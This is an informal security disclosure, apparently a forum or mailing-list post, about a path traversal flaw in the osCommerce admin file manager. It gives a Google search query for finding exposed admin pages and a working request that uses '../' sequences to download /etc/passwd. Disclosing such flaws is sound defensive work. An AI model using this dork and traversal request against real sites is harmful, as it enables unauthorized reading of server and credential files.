greets, 
while i was "warsearching" with google i suddenly 
have been on the admin interfaces of many oscommerce 
sites. i made a: 
allinurl:admin/file_manager.php 
 
for nomal you can only view your oscommerce 
directorys, but if you type in the following you can 
view any file on the server with the webservers 
permissions: 
file_manager.php?action=download&filename=../../../../../../../../
etc/passwd 
 
as you have to be logged in this isnt hot but i think  
its better to know about it.
